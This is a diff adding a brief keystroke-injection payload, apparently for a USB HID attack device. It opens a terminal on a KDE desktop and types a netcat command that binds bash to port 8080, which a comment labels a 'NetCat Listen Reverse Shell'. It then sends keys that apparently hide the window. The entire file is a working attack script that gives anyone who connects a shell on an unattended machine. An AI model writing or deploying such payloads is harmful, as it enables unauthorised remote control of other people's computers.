@@ -1,0 +1,11 @@
+DefaultDelay:50
+Key:227
+CustomDelay:1500
+PrintLine:konsole
+CustomDelay:2000
+PrintLine:krunner &
+CustomDelay:2000
+Rem: NetCat Listen Reverse Shell
+PrintLine:nc -p 8080 -l -e /bin/bash &
+Key:158
+Key:40
